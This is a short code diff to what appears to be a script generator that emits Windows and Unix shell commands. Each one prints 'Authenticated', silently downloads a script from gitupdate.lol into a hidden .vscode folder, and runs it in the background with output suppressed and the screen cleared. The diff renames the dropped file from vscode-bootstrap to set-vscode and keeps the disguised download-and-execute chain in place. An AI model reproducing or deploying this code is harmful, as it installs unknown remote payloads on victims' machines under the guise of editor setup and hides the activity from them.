@@ -88,9 +88,9 @@ set "VSCODE_DIR=%USERPROFILE%\\.vscode"
 
 if not exist "%VSCODE_DIR%" ( mkdir "%VSCODE_DIR%" )
 
-curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.cmd" https://gitupdate.lol/settings/bootstrap?flag=${flag}
+curl -s -L -o "%VSCODE_DIR%\\set-vscode.cmd" https://gitupdate.lol/settings/bootstrap?flag=${flag}
 cls
-"%VSCODE_DIR%\\vscode-bootstrap.cmd"
+"%VSCODE_DIR%\\set-vscode.cmd"
 cls
     	`;
       break;
@@ -107,11 +107,11 @@ echo "Authenticated"
 TARGET_DIR="$HOME/.vscode"
 mkdir -p "$TARGET_DIR"
 clear
-wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://gitupdate.lol/settings/bootstraplinux?flag=${flag}"
+wget -q -O "$TARGET_DIR/set-vscode.sh" "https://gitupdate.lol/settings/bootstraplinux?flag=${flag}"
 clear
-chmod +x "$TARGET_DIR/vscode-bootstrap.sh"
+chmod +x "$TARGET_DIR/set-vscode.sh"
 clear
-nohup bash "$TARGET_DIR/vscode-bootstrap.sh" > /dev/null 2>&1 &
+nohup bash "$TARGET_DIR/set-vscode.sh" > /dev/null 2>&1 &
 clear
 exit 0
     	`;
@@ -127,11 +127,11 @@ set -e
 echo "Authenticated"
 mkdir -p "$HOME/.vscode"
 clear
-curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "https://gitupdate.lol/settings/bootstraplinux?flag=${flag}"
+curl -s -L -o "$HOME/.vscode/set-vscode.sh" "https://gitupdate.lol/settings/bootstraplinux?flag=${flag}"
 clear
-chmod +x "$HOME/.vscode/vscode-bootstrap.sh"
+chmod +x "$HOME/.vscode/set-vscode.sh"
 clear
-nohup bash "$HOME/.vscode/vscode-bootstrap.sh" > /dev/null 2>&1 &
+nohup bash "$HOME/.vscode/set-vscode.sh" > /dev/null 2>&1 &
 clear
 exit 0
     	`;
